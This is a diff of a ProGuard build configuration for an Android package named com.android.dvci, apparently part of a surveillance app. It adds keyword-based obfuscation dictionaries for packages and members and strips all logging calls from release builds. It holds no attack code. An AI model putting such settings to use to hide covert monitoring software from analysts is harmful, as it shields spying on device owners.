@@ -38,6 +38,8 @@
 
 #-classobfuscationdictionary "compact.txt"
 -classobfuscationdictionary "keywords.txt"
+-packageobfuscationdictionary "keywords.txt"
+-obfuscationdictionary "keywords.txt"
 
 #togliere l'offuscamento di com.android.dvci.Core.isServiceRunning
 -keepclassmembers class com.android.dvci.Core {
@@ -57,17 +59,17 @@
 -keep public class com.android.dvci.BM
 -keep public class com.android.dvci.listener.AR
 -keep public class com.android.dvci.optimize.NetworkOptimizer
--keep public class com.android.dvci.util.Instrument
+-keep public class com.android.dvci.util.Inst
 
 -keep class com.musicg.** { *; }
 -keep class com.sun.media.sound.** { *; }
 -keep class android.media.** {*;}
     
-#-assumenosideeffects class android.util.Log {
-#    public static boolean isLoggable(java.lang.String, int);
-#    public static int v(...);
-#    public static int i(...);
-#    public static int w(...);
-#    public static int d(...);
-#    public static int e(...);
-#}
+-assumenosideeffects class android.util.Log {
+    public static boolean isLoggable(java.lang.String, int);
+    public static int v(...);
+    public static int i(...);
+    public static int w(...);
+    public static int d(...);
+    public static int e(...);
+}
